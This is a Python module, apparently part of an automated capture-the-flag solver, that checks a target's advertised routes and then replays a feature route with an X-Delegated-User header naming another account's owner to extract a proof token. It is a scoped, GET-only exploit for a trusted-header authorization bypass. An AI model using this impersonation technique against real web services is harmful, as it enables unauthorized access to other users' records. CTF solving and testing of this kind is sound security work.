#!/usr/bin/env python3
"""Exact-contract, GET-only delegated-identity reader.

The reader is deliberately narrower than a generic trusted-header probe.  It
sends nothing until the cached target-local ``/api/clues`` document names three
distinct, query-free routes and a current identity.  It then requires this
complete authority chain::

    GET identity_directory_route -> caller == current_role, records_owner != caller
    GET feature_route            -> 403 delegated_identity_rejected
                                    and Vary: x-delegated-user
    GET secondary_route          -> 403 delegated_identity_rejected

Only after those controls agree does it replay the *advertised feature route*
once with ``X-Delegated-User: <records_owner>``.  A plain answer is returned
only for one novel strict proof in a coherent JSON response whose exact effect
is ``delegated_identity_trusted``.  Every route and identity is derived from
target bytes; there is no role guess, route spray, POST, redirect, or fallback
header.

The caller supplies the scope-locked WebClient, deadline, request budget and
stop event.  Target bytes are parsed as bounded duplicate-key-free JSON and are
never evaluated or executed.
"""

from __future__ import annotations

import datetime as _dt
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from pathlib import Path


# ctf package import (script runs need the checkout root on sys.path)
try:
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt
except ModuleNotFoundError:
    import sys as _sys
    from pathlib import Path as _Path
    _sys.path.append(str(_Path(__file__).resolve().parents[2]))
    from ctf import env as ctf_env, paths as ctf_paths, flagfmt

HERE = Path(__file__).resolve().parent
_TK = HERE.parent / "toolkits"
if str(_TK) not in sys.path:
    sys.path.insert(0, str(_TK))
if str(HERE) not in sys.path:
    sys.path.insert(0, str(HERE))

import web as _web  # noqa: E402 -- sole production transport and route guard
import post_chain as _shared  # noqa: E402 -- shared proof/carrier policy
import security_json as _security_json  # noqa: E402 -- duplicate-key rejecting JSON


REQUEST_TIMEOUT = 8.0
DEFAULT_SECONDS = 20.0
DEFAULT_MAX_REQUESTS = 4
DEADLINE_PAD = 0.3
MAX_TEXT = 400_000
MAX_ROUTE_BYTES = 1024
MAX_IDENTITY_BYTES = 128

DELEGATED_HEADER = "X-Delegated-User"
_DELEGATED_HEADER_FOLDED = DELEGATED_HEADER.lower()
_DENIED_ERROR = "delegated_identity_rejected"
_TRUSTED_EFFECT = "delegated_identity_trusted"
_IDENTITY = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.@:-]{0,127}$")
_PROOF_SEEN = flagfmt.PROOF_ANYCASE


def enabled() -> bool:
    raw = ctf_env.get("CTF_WEB_DELEGATED_IDENTITY")
    if raw is not None:
        return raw.strip().lower() not in {"off", "0", "false", "no"}
    try:
        root = ctf_paths.workdir()
        return not (root / "_delegated_identity.off").exists()
    except Exception:
        return False


def _snake(value) -> str:
    value = re.sub(r"([a-z0-9])([A-Z])", r"\1_\2", str(value or ""))
    return re.sub(r"[^a-z0-9]+", "_", value.lower()).strip("_")


def _origin(value):
    try:
        parsed = urllib.parse.urlsplit(str(value or ""))
        if (parsed.scheme not in ("http", "https") or not parsed.hostname
                or parsed.username is not None or parsed.password is not None):
            return None
        return (parsed.scheme, parsed.hostname.lower().rstrip("."),
                parsed.port or (443 if parsed.scheme == "https" else 80))
    except Exception:
        return None


def _response(raw):
    if not isinstance(raw, dict):
        return None
    if "body" in raw:
        return raw
    if "text" in raw:
        out = dict(raw)
        out["body"] = str(raw.get("text") or "").encode("utf-8", "replace")
        return out
    return None


def _status(response):
    value = response.get("status") if isinstance(response, dict) else None
    return value if isinstance(value, int) and not isinstance(value, bool) else None


def _header_pairs(response):
    if not isinstance(response, dict):
        return None
    pairs = response.get("response_header_pairs")
    if isinstance(pairs, (list, tuple)):
        if any(not isinstance(row, (list, tuple)) or len(row) != 2 for row in pairs):
            return None
        return [(str(row[0]), str(row[1])) for row in pairs]
    headers = response.get("response_headers", response.get("headers", {}))
    if not isinstance(headers, dict):
        return None
    return [(str(key), str(value)) for key, value in headers.items()]


def _json(response):
    """Parse exactly the response entity as bounded, coherent JSON."""
    pairs = _header_pairs(response)
    if pairs is None:
        return None
    try:
        _web._validate_stream_framing(_status(response), pairs)
    except Exception:
        return None
    ctypes = [value.split(";", 1)[0].strip().lower() for key, value in pairs
              if key.strip().lower() == "content-type"]
    if len(set(ctypes)) != 1 or not ctypes or not (
            ctypes[0] == "application/json" or ctypes[0].endswith("+json")):
        return None
    body = response.get("body", response.get("text", "")) if isinstance(response, dict) else ""
    try:
        text = (bytes(body).decode("utf-8", "strict")
                if isinstance(body, (bytes, bytearray)) else str(body or ""))
        value = _security_json.loads(text, max_chars=MAX_TEXT)
    except Exception:
        return None
    return value if isinstance(value, (dict, list)) else None


def _safe_route(value, base_url):
    try:
        return _web.safe_same_origin_route(
            value, base_url, allow_query=False, max_bytes=MAX_ROUTE_BYTES)
    except Exception:
        return None


def _identity(value):
    if not isinstance(value, str) or not _IDENTITY.fullmatch(value):
        return None
    try:
        if len(value.encode("utf-8", "strict")) > MAX_IDENTITY_BYTES:
            return None
    except UnicodeError:
        return None
    return value


def _normalized_fields(document):
    """Map snake-equivalent keys once; aliases are ambiguity, never precedence."""
    if not isinstance(document, dict):
        return None
    out = {}
    for raw_key, value in document.items():
        key = _snake(raw_key)
        if not key or key in out:
            return None
        out[key] = value
    return out


def _cached_response(preloaded, route, base_url):
    """Return ``(present, response)`` for one exact cache key.

    A malformed or duplicate cache entry is present but unusable; callers must
    fail rather than refetching around conflicting evidence.
    """
    matches = []
    for raw_path, raw_response in list((preloaded or {}).items())[:80]:
        try:
            identity = _web.safe_preloaded_route_key(
                raw_path, base_url, max_bytes=MAX_ROUTE_BYTES)
        except Exception:
            identity = None
        if identity == route:
            matches.append(_response(raw_response))
    if not matches:
        return False, None
    if len(matches) != 1 or matches[0] is None:
        return True, None
    return True, matches[0]


def _cached_clues(preloaded, base_url):
    present, response = _cached_response(preloaded, "/api/clues", base_url)
    doc = _json(response)
    if not present or _status(response) not in range(200, 300) or not isinstance(doc, dict):
        return None, None
    return response, doc


def _contract(clues, base_url):
    fields = _normalized_fields(clues)
    if fields is None:
        return None
    current = _identity(fields.get("current_role"))
    feature = _safe_route(fields.get("feature_route"), base_url)
    directory = _safe_route(fields.get("identity_directory_route"), base_url)
    secondary = _safe_route(fields.get("secondary_route"), base_url)
    routes = (feature, directory, secondary)
    if (current is None or any(route is None for route in routes)
            or len(set(routes)) != len(routes) or "/api/clues" in routes):
        return None
    return {"current": current, "feature": feature,
            "directory": directory, "secondary": secondary}


def _directory_owner(document, current):
    fields = _normalized_fields(document)
    if fields is None:
        return None
    caller = _identity(fields.get("caller"))
    owner = _identity(fields.get("records_owner"))
    if caller != current or owner is None or owner == caller:
        return None
    return owner


def _vary_delegated(response) -> bool:
    pairs = _header_pairs(response)
    if pairs is None:
        return False
    values = [value for key, value in pairs if key.strip().lower() == "vary"]
    if len(values) != 1:
        return False
    tokens = [item.strip().lower() for item in values[0].split(",")]
    return tokens == [_DELEGATED_HEADER_FOLDED]


def _clean_control(response) -> bool:
    return not _shared.PAYOFF_LIKE.search(_shared._baseline_text(response))


def _denied(response, *, require_vary=False) -> bool:
    doc = _json(response)
    fields = _normalized_fields(doc)
    if (_status(response) != 403 or fields is None
            or _snake(fields.get("error")) != _DENIED_ERROR
            or not _clean_control(response)):
        return False
    # A denial carrying a simultaneous affirmative/effect is contradictory.
    if any(_shared._truthy(fields.get(key)) for key in ("ok", "success", "authorized", "trusted")):
        return False
    effect = _snake(fields.get("effect"))
    if effect:
        return False
    return _vary_delegated(response) if require_vary else True


class _Runner:
    def __init__(self, target, ctx):
        self.target = dict(target) if isinstance(target, dict) else {"url": str(target)}
        self.url = str(self.target.get("url") or "")
        self.ctx = dict(ctx or {})
        try:
            self.deadline = (float(self.ctx["deadline"]) if self.ctx.get("deadline") is not None
                             else time.time() + DEFAULT_SECONDS)
        except (TypeError, ValueError):
            self.deadline = time.time() + DEFAULT_SECONDS
        try:
            self.max_requests = max(0, int(self.ctx.get("max_requests", DEFAULT_MAX_REQUESTS)))
        except (TypeError, ValueError):
            self.max_requests = DEFAULT_MAX_REQUESTS
        self.external_stop = self.ctx.get("stop")
        self.preloaded = dict(self.ctx.get("preloaded") or {})
        supplied = list(self.ctx.get("baseline_texts") or [])
        self.baselines = [str(value or "")[:MAX_TEXT] for value in supplied[:80]]
        if len(supplied) > 80 and _shared.BASELINE_INCOMPLETE not in self.baselines:
            self.baselines.append(_shared.BASELINE_INCOMPLETE)
        for raw in list(self.preloaded.values())[:80]:
            response = _response(raw)
            if response is not None:
                value = _shared._baseline_text(response)
                if value not in self.baselines:
                    self.baselines.append(value)
        self.requests = 0
        self.responses = []
        self.candidates = []
        self.success = False
        self.uuid4 = False
        self.where = None
        self.stopped = None
        self.t0 = time.time()
        self.client = None
        self._gate = threading.Lock()
        self._stopped = False

    def _may_send(self):
        if self._stopped or (hasattr(self.external_stop, "is_set") and self.external_stop.is_set()):
            self.stopped = self.stopped or "stopped"
            return False
        if self.requests >= self.max_requests:
            self.stopped = self.stopped or "max_requests"
            return False
        if self.deadline is not None and self.deadline - time.time() <= DEADLINE_PAD:
            self.stopped = self.stopped or "deadline"
            return False
        return True

    def _client(self):
        if self.client is not None:
            return self.client
        wanted = _origin(self.url)
        if wanted is None:
            self.stopped = "invalid target origin"
            return None
        try:
            candidate = self.ctx.get("client")
            if candidate is None and callable(self.ctx.get("client_factory")):
                candidate = self.ctx["client_factory"](self.url, REQUEST_TIMEOUT)
            if candidate is None:
                candidate = _web.WebClient(self.url, timeout=REQUEST_TIMEOUT)
            if _origin(getattr(candidate, "base", None)) != wanted:
                self.stopped = "client scope mismatch"
                return None
            self.client = candidate
            return candidate
        except Exception as exc:
            self.stopped = f"no scoped client: {type(exc).__name__}"
            return None

    def stop_now(self):
        with self._gate:
            self._stopped = True

    def _allow_route(self, route):
        allowed = self.ctx.get("route_allowed")
        if not callable(allowed):
            return True
        try:
            return bool(allowed(route))
        except Exception:
            return False

    def get(self, path, role, *, headers=None):
        route = _safe_route(path, self.url)
        if route is None:
            self.stopped = self.stopped or "unsafe delegated-identity request"
            return None
        with self._gate:
            client = self._client()
            if client is None or not self._may_send():
                return None
            try:
                left = self.deadline - time.time() if self.deadline is not None else None
                client.timeout = REQUEST_TIMEOUT if left is None else max(
                    0.2, min(REQUEST_TIMEOUT, left - 0.1))
            except Exception:
                pass
            self.requests += 1
            try:
                response = client.request(
                    "GET", route, headers=dict(headers or {}), allow_redirects=False)
            except Exception as exc:
                self.responses.append({"role": role, "path": route, "status": None,
                                       "error": type(exc).__name__})
                self.stopped = self.stopped or f"transport: {type(exc).__name__}"
                self._stopped = True
                return None
            response = _response(response)
            self.responses.append({"role": role, "path": route,
                                   "status": _status(response)})
            return response

    def _control(self, route, role):
        present, response = _cached_response(self.preloaded, route, self.url)
        if present:
            if response is None:
                self.stopped = f"ambiguous cached {role}"
            return response
        return self.get(route, role)

    def run(self):
        if not enabled():
            self.stopped = "off"
            return None
        _clue_response, clues = _cached_clues(self.preloaded, self.url)
        contract = _contract(clues, self.url)
        if contract is None:
            self.stopped = "no exact cached delegated-identity contract"
            return None
        if not all(self._allow_route(contract[key]) for key in ("directory", "feature", "secondary")):
            self.stopped = "caller route policy refused delegated-identity route"
            return None

        missing = sum(not _cached_response(self.preloaded, contract[key], self.url)[0]
                      for key in ("directory", "feature", "secondary"))
        needed = missing + 1  # the owner-header payoff is always fresh
        if self.max_requests - self.requests < needed or not self._may_send():
            self.stopped = self.stopped or "insufficient budget for delegated-identity controls"
            return None
        if self._client() is None:
            return None

        directory = self._control(contract["directory"], "identity-directory-control")
        directory_doc = _json(directory)
        owner = (_directory_owner(directory_doc, contract["current"])
                 if _status(directory) in range(200, 300) else None)
        if owner is None or not _clean_control(directory):
            self.stopped = self.stopped or "identity directory did not establish one distinct records owner"
            return None
        self.baselines.append(_shared._baseline_text(directory))

        feature = self._control(contract["feature"], "feature-denial-control")
        self.baselines.append(_shared._baseline_text(feature))
        if not _denied(feature, require_vary=True):
            self.stopped = self.stopped or "feature denial did not establish delegated-header authority"
            return None

        secondary = self._control(contract["secondary"], "secondary-denial-control")
        self.baselines.append(_shared._baseline_text(secondary))
        if not _denied(secondary):
            self.stopped = self.stopped or "secondary route was not the distinct denied control"
            return None

        payoff = self.get(
            contract["feature"], "delegated-owner-payoff",
            headers={DELEGATED_HEADER: owner},
        )
        doc = _json(payoff)
        fields = _normalized_fields(doc)
        if (_status(payoff) not in range(200, 300) or fields is None
                or _shared._error(doc)
                or _snake(fields.get("effect")) != _TRUSTED_EFFECT):
            self.stopped = self.stopped or "delegated owner did not produce the exact trusted effect"
            return None

        anchor, siblings = _shared._coherent_json_view(payoff, doc)
        if anchor is None:
            self.stopped = "trusted effect did not occupy one coherent JSON carrier"
            return None
        sibling_candidates = _shared._carrier_candidates(siblings)
        if sibling_candidates:
            self.success = True
            self.where = "delegated_identity:owner"
            self.candidates = sibling_candidates[:12]
            self.stopped = "trusted anchor and proof/candidate occupied different carrier views"
            return None
        synthetic = dict(payoff)
        synthetic["body"] = anchor.encode("utf-8", "replace")
        synthetic["response_headers"] = {"Content-Type": "application/json"}
        synthetic.pop("response_header_pairs", None)
        synthetic.pop("headers", None)
        info = _shared.extract_anchored(
            synthetic, self.baselines, anchored=True,
            host=urllib.parse.urlsplit(self.url).hostname,
        )
        self.success = True
        self.where = "delegated_identity:owner"
        self.uuid4 = bool(info.get("uuid4"))
        self.candidates = list(info.get("candidates") or [])[:12]
        if info.get("auto") is None:
            self.stopped = "trusted effect carried no single novel strict proof"
        return info.get("auto")

    def summary(self, proof):
        incomplete = (_shared._proof_policy is not None
                      and hasattr(_shared._proof_policy, "baseline_set_incomplete")
                      and _shared._proof_policy.baseline_set_incomplete(self.baselines))
        return {"proof": proof, "class": "delegated_identity", "success": self.success,
                "terminal": False, "candidates": list(dict.fromkeys(self.candidates))[:12],
                "uuid4": self.uuid4,
                "baseline_proofs": list(dict.fromkeys(
                    match.group(0) for text in self.baselines
                    for match in _PROOF_SEEN.finditer(str(text or ""))))[:24],
                "baseline_incomplete": bool(incomplete), "requests": self.requests, "posts": 0,
                "seconds": round(time.time() - self.t0, 3), "where": self.where,
                "stopped": self.stopped, "responses": self.responses[:12]}


def _surface(runner, ctx):
    evidence = ctx.get("evidence") if isinstance(ctx, dict) else None
    if not isinstance(evidence, list):
        return
    aid = runner.target.get("answer_id") or "target"
    for value in list(dict.fromkeys(runner.candidates))[:6]:
        line = _web.safe_display_text(
            f"WEB DELEGATED-IDENTITY CANDIDATE {aid}: {value} "
            "(trusted-effect response; not auto-submitted)", 600)
        if line not in evidence:
            evidence.append(line)


def solve(target, ctx=None):
    """Solve one target; never raises and never submits."""
    ctx = dict(ctx or {})
    runner = _Runner(target, ctx)
    proof = None
    try:
        proof = runner.run()
    except Exception as exc:
        runner.stopped = runner.stopped or f"error: {type(exc).__name__}"
    finally:
        runner.stop_now()
    _surface(runner, ctx)
    summary = runner.summary(proof)
    aid = runner.target.get("answer_id") or "target"
    sink = ctx.get("result_sink")
    if isinstance(sink, dict):
        sink[aid] = summary
    _write_log(ctx.get("log_dir"), ctx.get("challenge"), aid, summary)
    return proof


def solve_targets(targets, ctx=None):
    out = {}
    for index, target in enumerate(list(targets or [])):
        if not isinstance(target, dict):
            continue
        item = dict(target)
        aid = str(item.get("answer_id") or item.get("id") or f"target-{index + 1}")
        item["answer_id"] = aid
        out[aid] = solve(item, ctx)
    return out


def _write_log(log_dir, challenge, aid, summary):
    if not log_dir:
        return
    try:
        folder = Path(log_dir)
        folder.mkdir(parents=True, exist_ok=True)
        row = {"at": _dt.datetime.now().astimezone().isoformat(timespec="seconds"),
               "challenge": challenge, "answer_id": aid, **summary}
        with (folder / "delegated_identity.jsonl").open("a", encoding="utf-8") as handle:
            handle.write(json.dumps(row, separators=(",", ":"), default=str) + "\n")
    except Exception:
        pass
